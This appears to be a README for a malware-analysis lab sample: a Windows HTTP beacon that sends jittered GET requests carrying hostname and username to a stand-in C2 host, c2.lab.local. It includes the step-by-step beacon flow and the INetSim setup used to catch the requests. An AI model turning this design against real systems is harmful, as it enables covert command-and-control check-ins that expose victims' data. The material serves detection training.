# A05.1a HTTP Beacon

## Summary

Sends periodic HTTP beacon requests to a controlled lab C2 endpoint.

The sample demonstrates beaconing behavior commonly associated with
malware command-and-control check-ins, host presence signaling, basic
agent telemetry, and periodic network polling.

Unlike loader and stager samples that retrieve or execute payloads,
this specimen focuses on repeated outbound communication. It sends
HTTP GET requests at randomized intervals using a fixed base sleep time
and jitter percentage.

The controlled beacon endpoint is:

```text
http://c2.lab.local/beacon
```

The sample sends a limited number of beacons and then exits cleanly.

No payload download, code execution, persistence, credential theft,
or destructive functionality is performed.

---

## Beacon Summary

The beacon behavior is a periodic HTTP GET request loop.

Each beacon request includes basic host and execution metadata in the
query string:

```text
/beacon?id=A05_1&host=<hostname>&user=<username>&seq=<number>&time=<unix_time>
```

The beacon uses the following user-agent:

```text
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
```

The timing behavior uses:

* Base sleep: `20000` milliseconds
* Jitter: `42%`
* Beacon count: `10`

This produces a randomized sleep range of approximately:

```text
11.60 seconds to 28.40 seconds
```

The sample uses:

```text
WebClient.DownloadString()
```

to send each request and read the controlled INetSim response.

---

## To Execute A05_1a

Make sure the analysis VM resolves:

```text
c2.lab.local
```

to the INetSim server IP:

```text
192.168.67.5
```

Then run the HTTP beacon sample directly:

```powershell
.\A05-Beaconing-Interactive-C2\A05_1a\bin\A05_1a_http_beacon.exe
```

Successful execution should show repeated beacon attempts followed by:

```text
[*] Beacon loop complete.
```

---

## Expected Beacon Artifacts

### Network Requests

Example request:

```text
GET /beacon?id=A05_1&host=WIN11-LAB&user=analyst&seq=0&time=1779739200 HTTP/1.1
Host: c2.lab.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
```

### Expected Console Output

```text
[*] Sending beacon to: http://c2.lab.local/beacon?id=A05_1&host=<hostname>&user=<username>&seq=0&time=<unix_time>
[+] Beacon successful. Response length: <length>
[*] Sleeping for <seconds> seconds
```

### Expected Dynamic Signals

Dynamic analysis tools may observe:

* Repeated DNS lookup for `c2.lab.local`
* Repeated HTTP GET requests to `/beacon`
* Browser-like user-agent string
* Query string host/user/sequence/timestamp metadata
* Jittered sleep intervals between requests
* No payload download
* No file creation
* No persistence behavior

---

## INetSim Configuration for A05_1a

This sample expects INetSim to serve a static response for:

```text
/beacon
```

over HTTP.

---

### Configure Static Fakefile Mapping

Edit:

```text
/etc/inetsim/inetsim.conf
```

Add:

```text
http_static_fakefile /beacon beacon.txt text/plain
```

---

### Create Fake Response File

Create the response file:

```bash
sudo nano /var/lib/inetsim/http/fakefiles/beacon.txt
```

Example contents:

```text
A05_1A_BEACON_ACK
```

Set ownership:

```bash
sudo chown inetsim:inetsim /var/lib/inetsim/http/fakefiles/beacon.txt
```

---

### Restart INetSim

```bash
sudo systemctl restart inetsim
```

---

### Expected INetSim Log Activity

Successful beaconing should generate repeated HTTP entries in:

```text
/var/log/inetsim/service.log
```

Example:

```text
[http_80_tcp] recv: GET /beacon?id=A05_1&host=WIN11-LAB&user=analyst&seq=0&time=1779739200 HTTP/1.1
[http_80_tcp] send: HTTP/1.1 200 OK
```

---

#########################################################################

# High-Level HTTP Beacon Flow

1. Start the HTTP beacon sample:

   ```text
   A05_1a_http_beacon.exe
   ```

2. Configure the target URI:

   ```text
   http://c2.lab.local/beacon
   ```

3. Configure timing parameters:

   ```text
   sleep = 20000
   jitter = 42
   maxBeacons = 10
   ```

4. Calculate jitter bounds:

   ```text
   lower = 11600 ms
   upper = 28400 ms
   ```

5. Create an HTTP client using:

   ```text
   WebClient
   ```

6. Enable default credentials:

   ```text
   UseDefaultCredentials = true
   ```

7. Add the browser-like user-agent header

8. Build the beacon URL with:

   * Sample ID
   * Hostname
   * Username
   * Sequence number
   * Unix timestamp

9. Send the beacon request using:

   ```text
   DownloadString()
   ```

10. Read the controlled INetSim response

11. Print success or failure status

12. Randomly select the next sleep interval inside the jitter range

13. Sleep using:

    ```text
    Thread.Sleep()
    ```

14. Repeat until `10` beacons have been sent

15. Exit cleanly after the beacon loop completes.
